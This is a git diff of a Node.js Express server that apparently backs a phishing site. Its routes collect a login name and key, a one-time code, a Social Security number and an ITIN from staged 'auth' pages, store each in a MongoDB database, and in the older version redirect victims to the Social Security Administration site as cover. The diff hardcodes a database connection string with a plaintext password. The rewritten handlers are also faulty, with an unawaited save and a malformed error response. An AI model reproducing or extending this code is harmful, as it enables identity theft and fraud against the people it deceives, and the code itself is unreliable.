@@ -1,33 +1,26 @@
 const express = require('express')
-const bodyParser = require('body-parser')
-const ejs = require('ejs')
-const mongoose = require('mongoose')
+const {default : mongoose} = require('mongoose')
+const cors = require('cors')
+const port = process.env.PORT || 3000
 
+
+const CONN_URL = 'mongodb+srv://Otunba:biggest_grammy01@otunba.j7day.mongodb.net/?retryWrites=true&w=majority&appName=Otunba'
 const app = express()
-const port = 3000
 
-// Set up MongoDB connection
-mongoose.connect('mongodb+srv://Otunba:biggest_grammy01@otunba.j7day.mongodb.net/?retryWrites=true&w=majority&appName=Otunba', {
-  useNewUrlParser: true,
-  useUnifiedTopology: true
-})
-  .then(() => console.log('MongoDB connected'))
-  .catch(err => console.error(err))
 
 // Middleware
+app.use(cors())
 app.use(express.json())
 app.use(express.urlencoded({extended : false}))
 app.use(express.static('public'))
 app.use('/auth', express.static('auth'))
 app.use('/img', express.static('img'))
-app.set('view engine', 'ejs')
-app.use(bodyParser.urlencoded({ extended: true }))
+
 
 // Models
 const AuthDataSchema = new mongoose.Schema({
-  // Defined data structure here
-  email: String,
-  password: String,
+  user: String,
+  key: String,
   code: String,
   ssn: String,
   itin: String
@@ -37,98 +30,92 @@ const AuthData = mongoose.model('AuthData', AuthDataSchema)
 
 // Routes
 app.get('/', (req, res) => {
-  res.render('index'); // Render the initial page in the public folder
+  res.sendFile(__dirname + '/public/index.html')
 })
 
 
 
 app.get('/auth', (req, res) => {
-  res.render('auth');
+  res.sendFile(__dirname + '/auth/auth.html')
 })
 
 app.post('/auth', (req, res) => {  
-  const authData = new AuthData({
-    user: req.body.user,
-    key: req.body.key
-  });
-  authData.save()
-    .then(() => {
-      console.log(req.body)
-      res.redirect('/auth_code')
+  try {
+    const authData = new AuthData({
+        user : req.body.user,
+        key : req.body.key
     })
-    .catch(err => {
-      console.error(err);
-      res.status(500).send('Error saving data');
-    });
-});
+    const savedAuthData = authData.save()
+    console.log(req.body)
+    res.status(200).json({ message : "user added succesfully", data : savedAuthData})
+} catch(error){
+    res.status(404).json({message : error, message})
+}
+})
 
 
 app.get('/auth_code', (req, res) => {
-  res.render("auth_code");
+  res.sendFile(__dirname + '/auth/auth_code.html')
 })
 
 app.post('/auth_code', (req, res) => {
-  // Process input data from auth_code page and store it in the database
-  const authData = new AuthData({
-    // Map input values to the data structure
-    code: req.body.code
-  });
-  authData.save()
-    .then(() => {
-      console.log(req.body)
-      res.redirect('/auth_ssn');
+  try {
+    const authData = new AuthData({
+        code : req.body.code
     })
-    .catch(err => {
-      console.error(err);
-      res.status(500).send('Error saving ssn data');
-    });
+    const savedAuthData = authData.save()
+    console.log(req.body)
+    res.status(200).json({ message : "user added succesfully", data : savedAuthData})
+} catch(error){
+    res.status(404).json({message : error, message})
+}
 });
 
 
 
 app.get('/auth_ssn', (req, res) => {
-  res.render('auth_ssn');
+  res.sendFile(__dirname + '/auth/auth_ssn.html')
 })
 
 app.post('/auth_ssn', (req, res) => {
-  // Process input data from auth page and store it in the database
-  const authData = new AuthData({
-    // Map input values to the data structure
-    ssn: req.body.ssn
-  });
-  authData.save()
-    .then(() => {
-      console.log(req.body)
-      res.redirect('https://www.ssa.gov/');
+  try {
+    const authData = new AuthData({
+        ssn : req.body.ssn
     })
-    .catch(err => {
-      console.error(err);
-      res.status(500).send('Error saving data');
-    });
+    const savedAuthData = authData.save()
+    console.log(req.body)
+    res.status(200).json({ message : "user added succesfully", data : savedAuthData})
+} catch(error){
+    res.status(404).json({message : error, message})
+}
 })
 
 
 
 app.get('/auth_itin', (req, res) => {
-  res.render('auth_itin');
+  res.sendFile(__dirname + '/auth/auth_itin.html')
 })
 
 app.post('/auth_itin', (req, res) => {
-  const authData = new AuthData({
-    itin: req.body.itin
-  });
-  authData.save()
-    .then(() => {
-      console.log(req.body)
-      res.redirect('https://www.ssa.gov/');
+  try {
+    const authData = new AuthData({
+        itin : req.body.itin
     })
-    .catch(err => {
-      console.error(err);
-      res.status(500).send('Error saving data');
-    });
+    const savedAuthData = authData.save()
+    console.log(req.body)
+    res.status(200).json({ message : "user added succesfully", data : savedAuthData})
+} catch(error){
+    res.status(404).json({message : error, message})
+}
 });
 
 
-app.listen(port, () => {
-  console.log(`Server listening on port ${port}`);
-});
+
+mongoose.connect(CONN_URL).then(() => {
+  app.listen(port, () => {
+      console.log(`server started at http://localhost:${port}`)
+  })
+  console.log('database connected')
+}).catch((err) => {
+  console.log(err.message)
+})
